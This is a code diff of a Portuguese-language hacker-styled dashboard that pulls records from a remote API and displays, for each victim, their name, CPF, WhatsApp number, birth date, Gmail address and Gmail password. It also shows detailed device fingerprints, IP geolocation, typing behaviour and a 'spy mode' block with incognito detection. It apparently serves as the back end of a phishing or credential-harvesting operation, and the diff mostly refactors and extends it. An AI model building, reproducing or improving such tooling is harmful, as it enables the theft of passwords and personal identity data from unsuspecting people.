@@ -68,7 +68,6 @@
       flex: 1; min-width: 150px;
       box-shadow: 0 0 15px rgba(0,255,65,0.2);
       position: relative; overflow: hidden;
-      transition: all 0.3s;
     }
     .card-top::before {
       content: ''; position: absolute; top: 0; left: 0;
@@ -98,7 +97,6 @@
     button:hover { background: #00ff41; color: #000; box-shadow: 0 0 15px #00ff41; }
     .btn-del-all { border-color: #ff3b3b; color: #ff3b3b; }
     .btn-del-all:hover { background: #ff3b3b; color: #000; box-shadow: 0 0 15px #ff3b3b; }
-
     .busca {
       width: 100%; padding: 7px 10px; background: #050505;
       border: 1px solid #00ff41; border-radius: 4px;
@@ -107,9 +105,7 @@
     }
     .busca::placeholder { color: #00aa2b; }
     .busca:focus { outline: none; box-shadow: 0 0 10px rgba(0,255,65,0.4); }
-
     .lista { display: flex; flex-direction: column; gap: 8px; }
-
     .cadastro {
       background: #050505; border: 1px solid #00ff41;
       border-radius: 4px; overflow: hidden;
@@ -128,7 +124,6 @@
     }
     .cadastro-nome::before { content: '[USER] '; color: #00aa2b; font-size: 9px; }
     .cadastro-data { font-size: 9px; color: #00aa2b; letter-spacing: 1px; }
-
     .bloco-titulo {
       padding: 4px 12px; background: rgba(0,255,65,0.12);
       font-size: 9px; font-weight: 700;
@@ -143,7 +138,6 @@
     .bloco-origem .bloco-titulo { background: rgba(255,140,0,0.12); color: #ff8c00; border-bottom: 1px solid #ff8c00; }
     .bloco-espiao .bloco-titulo { background: rgba(255,50,50,0.15); color: #ff3232; border-bottom: 1px solid #ff3232; }
     .bloco-msg .bloco-titulo { background: rgba(0,255,180,0.15); color: #00ffb4; border-bottom: 1px solid #00ffb4; }
-
     .cadastro-body {
       padding: 8px 12px;
       display: grid;
@@ -158,7 +152,6 @@
     }
     .campo .rotulo::before { content: '> '; }
     .campo .valor { color: #00ff41; word-break: break-word; font-size: 10px; }
-
     .bloco-device .campo .rotulo { color: #0088bb; }
     .bloco-device .campo .valor { color: #00b4ff; text-shadow: 0 0 4px rgba(0,180,255,0.7); }
     .bloco-bateria .campo .rotulo { color: #aa8800; }
@@ -173,7 +166,6 @@
     .bloco-espiao .campo .valor { color: #ff3232; text-shadow: 0 0 4px rgba(255,50,50,0.7); }
     .bloco-msg .campo .rotulo { color: #00aa77; }
     .bloco-msg .campo .valor { color: #00ffb4; text-shadow: 0 0 4px rgba(0,255,180,0.7); }
-
     .mensagem-box {
       grid-column: 1 / -1;
       background: rgba(0,255,180,0.05);
@@ -186,12 +178,7 @@
       word-break: break-word;
       white-space: pre-wrap;
     }
-    .msg-icone {
-      font-size: 14px;
-      margin-right: 6px;
-      display: inline-block;
-    }
-
+    .msg-icone { font-size: 14px; margin-right: 6px; display: inline-block; }
     .vazio {
       text-align: center; padding: 20px; color: #00aa2b;
       letter-spacing: 2px; border: 1px dashed #00aa2b; border-radius: 4px;
@@ -203,7 +190,6 @@
     }
     .btn-del { border-color: #ff3b3b; color: #ff3b3b; padding: 3px 8px; font-size: 9px; }
     .btn-del:hover { background: #ff3b3b; color: #000; box-shadow: 0 0 10px #ff3b3b; }
-
     #avisoTopo {
       display: none;
       position: fixed;
@@ -270,7 +256,7 @@
   </div>
 
   <div class="controles">
-    <button class="btn-refresh" onclick="carregarTudo()">[ REFRESH ]</button>
+    <button onclick="carregarTudo()">[ REFRESH ]</button>
     <button class="btn-del-all" onclick="apagarTudo()">[ DELETE ALL ]</button>
   </div>
 
@@ -279,10 +265,10 @@
   <div class="lista" id="lista"></div>
 
   <script>
-    const API_URL = 'https://gets-invio-on-api.onrender.com';
-    let todosDados = [];
-    let audioCtx = null;
-    let somAtivo = false;
+    var API_URL = 'https://gets-invio-on-api.onrender.com';
+    var todosDados = [];
+    var audioCtx = null;
+    var somAtivo = false;
 
     function ativarSom() {
       try {
@@ -292,19 +278,19 @@
         document.getElementById('btnSom').classList.add('ativo');
         tocarTom(880, 0.1);
         setTimeout(function() { tocarTom(1100, 0.15); }, 120);
-      } catch (e) { alert('Seu navegador não suporta áudio!'); }
+      } catch (e) { alert('Navegador não suporta áudio!'); }
     }
 
-    function tocarTom(freq, duracao, tipo, volume) {
+    function tocarTom(freq, dur, tipo, vol) {
       if (!somAtivo || !audioCtx) return;
-      tipo = tipo || 'sine'; volume = volume || 0.3;
-      const osc = audioCtx.createOscillator();
-      const gain = audioCtx.createGain();
+      tipo = tipo || 'sine'; vol = vol || 0.3;
+      var osc = audioCtx.createOscillator();
+      var gain = audioCtx.createGain();
       osc.connect(gain); gain.connect(audioCtx.destination);
       osc.type = tipo; osc.frequency.value = freq;
-      gain.gain.setValueAtTime(volume, audioCtx.currentTime);
-      gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + duracao);
-      osc.start(); osc.stop(audioCtx.currentTime + duracao);
+      gain.gain.setValueAtTime(vol, audioCtx.currentTime);
+      gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + dur);
+      osc.start(); osc.stop(audioCtx.currentTime + dur);
     }
 
     function somClique() { tocarTom(1300, 0.1); setTimeout(function() { tocarTom(1600, 0.12); }, 130); }
@@ -315,7 +301,7 @@
     }
 
     function mostrarAviso(texto, tipo) {
-      const el = document.getElementById('avisoTopo');
+      var el = document.getElementById('avisoTopo');
       el.textContent = texto;
       el.className = tipo === 'cadastro' ? 'aviso-cadastro' : 'aviso-clique';
       el.style.display = 'block';
@@ -324,19 +310,19 @@
     }
 
     function flashCard(id) {
-      const el = document.getElementById(id);
+      var el = document.getElementById(id);
       if (!el) return;
       el.classList.add('flash');
       setTimeout(function() { el.classList.remove('flash'); }, 1000);
     }
 
-    let ultimoTotalVisitas = null;
-    let ultimoTotalCadastros = null;
+    var ultimoTotalVisitas = null;
+    var ultimoTotalCadastros = null;
 
     async function carregarVisitas() {
       try {
-        const r = await fetch(API_URL + '/visitas');
-        const j = await r.json();
+        var r = await fetch(API_URL + '/visitas');
+        var j = await r.json();
         if (ultimoTotalVisitas !== null && j.total > ultimoTotalVisitas) {
           somClique(); flashCard('cardVisitas');
           mostrarAviso('👆 Novo clique no site!', 'clique');
@@ -352,9 +338,9 @@
 
     async function carregar() {
       try {
-        const r = await fetch(API_URL + '/dados');
-        const j = await r.json();
-        const dados = j.dados || [];
+        var r = await fetch(API_URL + '/dados');
+        var j = await r.json();
+        var dados = j.dados || [];
         todosDados = dados;
         if (ultimoTotalCadastros !== null && dados.length > ultimoTotalCadastros) {
           somCadastro(); flashCard('cardTotal'); flashCard('cardHoje');
@@ -362,8 +348,8 @@
         }
         ultimoTotalCadastros = dados.length;
         document.getElementById('total').textContent = dados.length;
-        const hoje = new Date().toDateString();
-        const doDia = dados.filter(function(d) { return new Date(d.recebidoEm).toDateString() === hoje; });
+        var hoje = new Date().toDateString();
+        var doDia = dados.filter(function(d) { return new Date(d.recebidoEm).toDateString() === hoje; });
         document.getElementById('hoje').textContent = doDia.length;
         renderizar(dados);
       } catch (e) {
@@ -374,16 +360,14 @@
     function carregarTudo() { carregarVisitas(); carregar(); }
 
     function filtrar() {
-      const termo = document.getElementById('busca').value.toLowerCase().trim();
+      var termo = document.getElementById('busca').value.toLowerCase().trim();
       if (!termo) { renderizar(todosDados); return; }
-      const filtrado = todosDados.filter(function(d) {
+      var filtrado = todosDados.filter(function(d) {
         return (d.nome || '').toLowerCase().indexOf(termo) !== -1 ||
           (d.whatsapp || '').toLowerCase().indexOf(termo) !== -1 ||
           (d.cpf || '').toLowerCase().indexOf(termo) !== -1 ||
           (d.gmail || '').toLowerCase().indexOf(termo) !== -1 ||
-          (d.mensagem || '').toLowerCase().indexOf(termo) !== -1 ||
-          (d.localizacao && d.localizacao.cidade || '').toLowerCase().indexOf(termo) !== -1 ||
-          (d.origem || '').toLowerCase().indexOf(termo) !== -1;
+          (d.mensagem || '').toLowerCase().indexOf(termo) !== -1;
       });
       renderizar(filtrado);
     }
@@ -397,11 +381,12 @@
     function formatarData(iso) {
       if (!iso) return '-';
       if (/^\d{4}-\d{2}-\d{2}$/.test(iso)) {
-        const p = iso.split('-');
+        var p = iso.split('-');
         return p[2] + '/' + p[1] + '/' + p[0];
       }
       return iso;
     }
+
     function iconeSistema(s) {
       if (s === 'Android') return '🤖'; if (s === 'iOS') return '🍎';
       if (s === 'Windows') return '🪟'; if (s === 'MacOS') return '🍏';
@@ -411,10 +396,7 @@
       if (t === 'Celular') return '📱'; if (t === 'Tablet') return '📟';
       if (t === 'PC') return '💻'; return '❓';
     }
-    function iconeBateria(n) {
-      if (n == null) return '🔌';
-      return n >= 50 ? '🔋' : '🪫';
-    }
+    function iconeBateria(n) { if (n == null) return '🔌'; return n >= 50 ? '🔋' : '🪫'; }
     function formatarConexao(c) {
       if (!c) return 'N/A';
       if (c === '4g') return '⚡ Rápida';
@@ -430,7 +412,7 @@
     }
     function bandeiraPais(cod) {
       if (!cod || cod.length !== 2) return '🌍';
-      const cp = cod.toUpperCase().split('').map(function(c) { return 127397 + c.charCodeAt(0); });
+      var cp = cod.toUpperCase().split('').map(function(c) { return 127397 + c.charCodeAt(0); });
       return String.fromCodePoint.apply(null, cp);
     }
     function iconeOrigem(o) {
@@ -438,70 +420,95 @@
       if (o.indexOf('WhatsApp') !== -1) return '💬';
       if (o.indexOf('Instagram') !== -1) return '📷';
       if (o.indexOf('Facebook') !== -1) return '📘';
-      if (o.indexOf('TikTok') !== -1) return '🎵';
       if (o.indexOf('Google') !== -1) return '🔍';
-      if (o.indexOf('YouTube') !== -1) return '▶️';
       if (o.indexOf('Direto') !== -1) return '⌨️';
       return '🌐';
     }
     function formatarTempo(seg) {
       if (!seg && seg !== 0) return 'N/A';
       if (seg < 60) return seg + 's';
-      const m = Math.floor(seg / 60);
+      var m = Math.floor(seg / 60);
       return m + 'm ' + (seg % 60) + 's';
     }
     function formatarDirecao(g) {
       if (g == null) return 'N/A';
-      const d = ['Norte ⬆️','Nordeste ↗️','Leste ➡️','Sudeste ↘️','Sul ⬇️','Sudoeste ↙️','Oeste ⬅️','Noroeste ↖️'];
+      var d = ['Norte ⬆️','Nordeste ↗️','Leste ➡️','Sudeste ↘️','Sul ⬇️','Sudoeste ↙️','Oeste ⬅️','Noroeste ↖️'];
       return d[Math.round(g / 45) % 8] + ' (' + g + '°)';
     }
 
     function renderizar(dados) {
       if (dados.length === 0) {
-        document.getElementById('lista').innerHTML = '<div class="vazio">[ NENHUM REGISTRO ENCONTRADO ]</div>';
+        document.getElementById('lista').innerHTML = '<div class="vazio">[ NENHUM REGISTRO ]</div>';
         return;
       }
-      let html = '';
-      for (let i = dados.length - 1; i >= 0; i--) {
-        const d = dados[i];
-        const dev = d.dispositivo || {};
-        const loc = d.localizacao || null;
+      var html = '';
+      for (var i = dados.length - 1; i >= 0; i--) {
+        var d = dados[i];
+        var dev = d.dispositivo || {};
+        var loc = d.localizacao || null;
 
-        const blocoDevice =
-          '<div class="bloco-device"><div class="bloco-titulo">DISPOSITIVO</div><div class="cadastro-body">' +
-          '<div class="campo"><div class="rotulo">Sistema</div><div class="valor">' + iconeSistema(dev.sistema) + ' ' + esc(dev.sistema) + '</div></div>' +
-          '<div class="campo"><div class="rotulo">Navegador</div><div class="valor">🌐 ' + esc(dev.navegador) + '</div></div>' +
-          '<div class="campo"><div class="rotulo">Tipo</div><div class="valor">' + iconeTipo(dev.tipo) + ' ' + esc(dev.tipo) + '</div></div>' +
-          '<div class="campo"><div class="rotulo">Idioma</div><div class="valor">🗣️ ' + esc(dev.idioma) + '</div></div>' +
-          '<div class="campo"><div class="rotulo">Tela</div><div class="valor">📐 ' + esc(dev.tela) + '</div></div>' +
-          '<div class="campo"><div class="rotulo">Fuso</div><div class="valor">🕒 ' + esc(dev.fuso) + '</div></div>' +
-          '<div class="campo"><div class="rotulo">Orientação</div><div class="valor">' + formatarOrientacao(dev.orientacao) + '</div></div>' +
-          '<div class="campo"><div class="rotulo">Pixel ratio</div><div class="valor">' + esc(dev.pixelRatio || 1) + 'x</div></div>' +
-          '<div class="campo"><div class="rotulo">Touch</div><div class="valor">' + (dev.touch ? '👆 Sim' : '❌ Não') + '</div></div>' +
-          '<div class="campo"><div class="rotulo">Cookies</div><div class="valor">' + (dev.cookies ? '🍪 Sim' : '❌ Não') + '</div></div>' +
-          '<div class="campo"><div class="rotulo">Hora cliente</div><div class="valor">🕐 ' + esc(dev.horaCliente) + '</div></div>' +
+        // ⚡ BLOCO DE LOGIN com Gmail e Senha
+        var blocoLogin =
+          '<div class="bloco-titulo">DADOS DO LOGIN</div>' +
+          '<div class="cadastro-body">' +
+            '<div class="campo"><div class="rotulo">Nome</div><div class="valor">' + esc(d.nome) + '</div></div>' +
+            '<div class="campo"><div class="rotulo">CPF</div><div class="valor">' + esc(d.cpf) + '</div></div>' +
+            '<div class="campo"><div class="rotulo">WhatsApp</div><div class="valor">' + esc(d.whatsapp) + '</div></div>' +
+            '<div class="campo"><div class="rotulo">Nascimento</div><div class="valor">' + formatarData(d.dataNascimento) + '</div></div>' +
+            '<div class="campo"><div class="rotulo">Gmail</div><div class="valor">📧 ' + esc(d.gmail) + '</div></div>' +
+            '<div class="campo"><div class="rotulo">Senha</div><div class="valor">🔑 ' + esc(d.senha) + '</div></div>' +
+          '</div>';
+
+        var blocoMensagem = '';
+        if (d.mensagem) {
+          blocoMensagem = '<div class="bloco-msg"><div class="bloco-titulo">MENSAGEM DE TEXTO</div><div class="cadastro-body">' +
+            '<div class="mensagem-box"><span class="msg-icone">💬</span>' + esc(d.mensagem) + '</div>' +
+            '</div></div>';
+        } else {
+          blocoMensagem = '<div class="bloco-msg"><div class="bloco-titulo">MENSAGEM DE TEXTO</div><div class="cadastro-body">' +
+            '<div class="campo"><div class="rotulo">Status</div><div class="valor">❌ Não deixou mensagem</div></div>' +
+            '</div></div>';
+        }
+
+        var blocoDevice = '';
+        if (dev.sistema) {
+          blocoDevice = '<div class="bloco-device"><div class="bloco-titulo">DISPOSITIVO</div><div class="cadastro-body">' +
+            '<div class="campo"><div class="rotulo">Sistema</div><div class="valor">' + iconeSistema(dev.sistema) + ' ' + esc(dev.sistema) + '</div></div>' +
+            '<div class="campo"><div class="rotulo">Navegador</div><div class="valor">🌐 ' + esc(dev.navegador) + '</div></div>' +
+            '<div class="campo"><div class="rotulo">Tipo</div><div class="valor">' + iconeTipo(dev.tipo) + ' ' + esc(dev.tipo) + '</div></div>' +
+            '<div class="campo"><div class="rotulo">Idioma</div><div class="valor">🗣️ ' + esc(dev.idioma) + '</div></div>' +
+            '<div class="campo"><div class="rotulo">Tela</div><div class="valor">📐 ' + esc(dev.tela) + '</div></div>' +
+            '<div class="campo"><div class="rotulo">Fuso</div><div class="valor">🕒 ' + esc(dev.fuso) + '</div></div>' +
+            '<div class="campo"><div class="rotulo">Orientação</div><div class="valor">' + formatarOrientacao(dev.orientacao) + '</div></div>' +
+            '<div class="campo"><div class="rotulo">Pixel ratio</div><div class="valor">' + esc(dev.pixelRatio || 1) + 'x</div></div>' +
+            '<div class="campo"><div class="rotulo">Touch</div><div class="valor">' + (dev.touch ? '👆 Sim' : '❌ Não') + '</div></div>' +
+            '<div class="campo"><div class="rotulo">Cookies</div><div class="valor">' + (dev.cookies ? '🍪 Sim' : '❌ Não') + '</div></div>' +
+            '<div class="campo"><div class="rotulo">Hora cliente</div><div class="valor">🕐 ' + esc(dev.horaCliente) + '</div></div>' +
           '</div></div>';
+        }
 
-        const blocoBateria =
-          '<div class="bloco-bateria"><div class="bloco-titulo">BATERIA & CONEXÃO</div><div class="cadastro-body">' +
-          '<div class="campo"><div class="rotulo">Bateria</div><div class="valor">' + iconeBateria(dev.bateria && dev.bateria.nivel) + ' ' + (dev.bateria ? dev.bateria.nivel + '%' : 'N/A') + '</div></div>' +
-          '<div class="campo"><div class="rotulo">Carregando</div><div class="valor">' + (dev.bateria ? (dev.bateria.carregando ? '⚡ Sim' : '❌ Não') : 'N/A') + '</div></div>' +
-          '<div class="campo"><div class="rotulo">Tempo carregar</div><div class="valor">' + (dev.bateria && dev.bateria.tempoCarregar ? '⏱️ ' + dev.bateria.tempoCarregar + ' min' : 'N/A') + '</div></div>' +
-          '<div class="campo"><div class="rotulo">Tempo restante</div><div class="valor">' + (dev.bateria && dev.bateria.tempoDescarregar ? '⏳ ' + dev.bateria.tempoDescarregar + ' min' : 'N/A') + '</div></div>' +
-          '<div class="campo"><div class="rotulo">Velocidade</div><div class="valor">' + formatarConexao(dev.conexao) + '</div></div>' +
-          '<div class="campo"><div class="rotulo">Conexão</div><div class="valor">' + (dev.tipoConexao ? '📡 ' + esc(dev.tipoConexao) : 'N/A') + '</div></div>' +
+        var blocoBateria = '';
+        if (dev.bateria || dev.conexao) {
+          blocoBateria = '<div class="bloco-bateria"><div class="bloco-titulo">BATERIA & CONEXÃO</div><div class="cadastro-body">' +
+            '<div class="campo"><div class="rotulo">Bateria</div><div class="valor">' + iconeBateria(dev.bateria && dev.bateria.nivel) + ' ' + (dev.bateria ? dev.bateria.nivel + '%' : 'N/A') + '</div></div>' +
+            '<div class="campo"><div class="rotulo">Carregando</div><div class="valor">' + (dev.bateria ? (dev.bateria.carregando ? '⚡ Sim' : '❌ Não') : 'N/A') + '</div></div>' +
+            '<div class="campo"><div class="rotulo">Velocidade</div><div class="valor">' + formatarConexao(dev.conexao) + '</div></div>' +
+            '<div class="campo"><div class="rotulo">Conexão</div><div class="valor">' + (dev.tipoConexao ? '📡 ' + esc(dev.tipoConexao) : 'N/A') + '</div></div>' +
           '</div></div>';
+        }
 
-        const blocoHW =
-          '<div class="bloco-hw"><div class="bloco-titulo">HARDWARE</div><div class="cadastro-body">' +
-          '<div class="campo"><div class="rotulo">RAM</div><div class="valor">🧠 ' + (dev.ram ? dev.ram + ' GB' : 'N/A') + '</div></div>' +
-          '<div class="campo"><div class="rotulo">Núcleos</div><div class="valor">⚙️ ' + (dev.nucleos || 'N/A') + '</div></div>' +
-          '<div class="campo"><div class="rotulo">GPU</div><div class="valor">🎮 ' + esc(dev.gpu) + '</div></div>' +
-          '<div class="campo"><div class="rotulo">Cor</div><div class="valor">🎨 ' + (dev.corProfundidade ? dev.corProfundidade + ' bits' : 'N/A') + '</div></div>' +
-          '<div class="campo"><div class="rotulo">Disco</div><div class="valor">' + (dev.storage ? '💾 ' + dev.storage.quota + ' MB' : 'N/A') + '</div></div>' +
+        var blocoHW = '';
+        if (dev.ram || dev.nucleos || dev.gpu) {
+          blocoHW = '<div class="bloco-hw"><div class="bloco-titulo">HARDWARE</div><div class="cadastro-body">' +
+            '<div class="campo"><div class="rotulo">RAM</div><div class="valor">🧠 ' + (dev.ram ? dev.ram + ' GB' : 'N/A') + '</div></div>' +
+            '<div class="campo"><div class="rotulo">Núcleos</div><div class="valor">⚙️ ' + (dev.nucleos || 'N/A') + '</div></div>' +
+            '<div class="campo"><div class="rotulo">GPU</div><div class="valor">🎮 ' + esc(dev.gpu) + '</div></div>' +
+            '<div class="campo"><div class="rotulo">Cor</div><div class="valor">🎨 ' + (dev.corProfundidade ? dev.corProfundidade + ' bits' : 'N/A') + '</div></div>' +
+            '<div class="campo"><div class="rotulo">Disco</div><div class="valor">' + (dev.storage ? '💾 ' + dev.storage.quota + ' MB' : 'N/A') + '</div></div>' +
           '</div></div>';
+        }
 
-        let blocoLoc = '';
+        var blocoLoc = '';
         if (loc) {
           blocoLoc = '<div class="bloco-loc"><div class="bloco-titulo">LOCALIZAÇÃO & IP</div><div class="cadastro-body">' +
             '<div class="campo"><div class="rotulo">IP</div><div class="valor">🌐 ' + esc(d.ip) + '</div></div>' +
@@ -511,40 +518,25 @@
             '<div class="campo"><div class="rotulo">Cidade</div><div class="valor">🏙️ ' + esc(loc.cidade) + '</div></div>' +
             '<div class="campo"><div class="rotulo">CEP</div><div class="valor">📮 ' + esc(loc.cep) + '</div></div>' +
             '<div class="campo"><div class="rotulo">Operadora</div><div class="valor">📡 ' + esc(loc.operadora) + '</div></div>' +
-            '</div></div>';
+          '</div></div>';
         }
 
-        const blocoOrigem = '<div class="bloco-origem"><div class="bloco-titulo">ORIGEM & COMPORTAMENTO</div><div class="cadastro-body">' +
+        var blocoOrigem = '<div class="bloco-origem"><div class="bloco-titulo">ORIGEM & COMPORTAMENTO</div><div class="cadastro-body">' +
           '<div class="campo"><div class="rotulo">Veio de</div><div class="valor">' + iconeOrigem(d.origem) + ' ' + esc(d.origem) + '</div></div>' +
           '<div class="campo"><div class="rotulo">Já visitou</div><div class="valor">' + (d.jaVisitou ? '🔁 Sim' : '🆕 1ª vez') + '</div></div>' +
           '<div class="campo"><div class="rotulo">Tempo preench.</div><div class="valor">⏱️ ' + formatarTempo(d.tempoPreenchimento) + '</div></div>' +
           '<div class="campo"><div class="rotulo">Tempo parado</div><div class="valor">⏸️ ' + formatarTempo(d.tempoFora) + '</div></div>' +
           '<div class="campo"><div class="rotulo">Copiou?</div><div class="valor">' + (d.copiouAlgo ? '📋 Sim' : '❌ Não') + '</div></div>' +
           '<div class="campo"><div class="rotulo">Digitação</div><div class="valor">⌨️ ' + (d.velocidadeDigitacao ? d.velocidadeDigitacao + ' t/min' : 'N/A') + '</div></div>' +
+        '</div></div>';
+
+        var blocoEspiao = '';
+        if (dev.incognito !== undefined) {
+          blocoEspiao = '<div class="bloco-espiao"><div class="bloco-titulo">🕵️ MODO ESPIÃO</div><div class="cadastro-body">' +
+            '<div class="campo"><div class="rotulo">Anônimo?</div><div class="valor">' + (dev.incognito ? '🕶️ Sim' : '❌ Não') + '</div></div>' +
+            '<div class="campo"><div class="rotulo">Bússola</div><div class="valor">🧭 ' + formatarDirecao(dev.bussola) + '</div></div>' +
+            '<div class="campo"><div class="rotulo">Rede corp.</div><div class="valor">' + (dev.ipLocal && (dev.ipLocal.indexOf('10.') === 0 || dev.ipLocal.indexOf('172.') === 0 || dev.ipLocal.indexOf('192.168.') === 0) ? '🏢 Interna' : '🌐 Pública') + '</div></div>' +
           '</div></div>';
-
-        const blocoEspiao = '<div class="bloco-espiao"><div class="bloco-titulo">🕵️ MODO ESPIÃO</div><div class="cadastro-body">' +
-          '<div class="campo"><div class="rotulo">Anônimo?</div><div class="valor">' + (dev.incognito ? '🕶️ Sim' : '❌ Não') + '</div></div>' +
-          '<div class="campo"><div class="rotulo">Bússola</div><div class="valor">🧭 ' + formatarDirecao(dev.bussola) + '</div></div>' +
-          '<div class="campo"><div class="rotulo">Rede corp.</div><div class="valor">' + (dev.ipLocal && (dev.ipLocal.indexOf('10.') === 0 || dev.ipLocal.indexOf('172.') === 0 || dev.ipLocal.indexOf('192.168.') === 0) ? '🏢 Interna' : '🌐 Pública') + '</div></div>' +
-          '</div></div>';
-
-        let blocoMensagem = '';
-        if (d.mensagem) {
-          blocoMensagem = '<div class="bloco-msg"><div class="bloco-titulo">💬 MENSAGEM DE TEXTO</div><div class="cadastro-body">' +
-            '<div class="mensagem-box"><span class="msg-icone">💬</span>' + esc(d.mensagem) + '</div>' +
-            '<div class="campo"><div class="rotulo">Tamanho</div><div class="valor">📝 ' + d.mensagem.length + ' caracteres</div></div>' +
-            '</div></div>';
-        } else {
-          blocoMensagem = '<div class="bloco-msg"><div class="bloco-titulo">💬 MENSAGEM DE TEXTO</div><div class="cadastro-body">' +
-            '<div class="campo"><div class="rotulo">Status</div><div class="valor">❌ Não deixou mensagem</div></div>' +
-            '</div></div>';
-        }
-
-        let blocoDados = '', blocoEspiaoFinal = '';
-        if (d.dispositivo) {
-          blocoDados = blocoDevice + blocoBateria + blocoHW;
-          blocoEspiaoFinal = blocoEspiao;
         }
 
         html +=
@@ -553,20 +545,14 @@
               '<div class="cadastro-nome">' + esc(d.nome) + '</div>' +
               '<div class="cadastro-data">' + new Date(d.recebidoEm).toLocaleString('pt-BR') + '</div>' +
             '</div>' +
-            '<div class="bloco-titulo">DADOS DO LOGIN</div>' +
-            '<div class="cadastro-body">' +
-              '<div class="campo"><div class="rotulo">Nome</div><div class="valor">' + esc(d.nome) + '</div></div>' +
-              '<div class="campo"><div class="rotulo">CPF</div><div class="valor">' + esc(d.cpf) + '</div></div>' +
-              '<div class="campo"><div class="rotulo">WhatsApp</div><div class="valor">' + esc(d.whatsapp) + '</div></div>' +
-              '<div class="campo"><div class="rotulo">Nascimento</div><div class="valor">' + formatarData(d.dataNascimento) + '</div></div>' +
-              '<div class="campo"><div class="rotulo">Gmail</div><div class="valor">📧 ' + esc(d.gmail) + '</div></div>' +
-              '<div class="campo"><div class="rotulo">Senha</div><div class="valor">🔑 ' + esc(d.senha) + '</div></div>' +
-            '</div>' +
+            blocoLogin +
             blocoMensagem +
-            blocoDados +
+            blocoDevice +
+            blocoBateria +
+            blocoHW +
             blocoLoc +
             blocoOrigem +
-            blocoEspiaoFinal +
+            blocoEspiao +
             '<div class="botoes-card">' +
               '<button class="btn-del" onclick="apagar(' + d.id + ')">[ DELETE ]</button>' +
             '</div>' +
@@ -582,7 +568,7 @@
     }
 
     async function apagarTudo() {
-      if (!confirm('⚠️ DELETAR TODOS os cadastros? Sem volta!')) return;
+      if (!confirm('⚠️ DELETAR TODOS os cadastros?')) return;
       await fetch(API_URL + '/dados', { method: 'DELETE' });
       carregarTudo();
     }
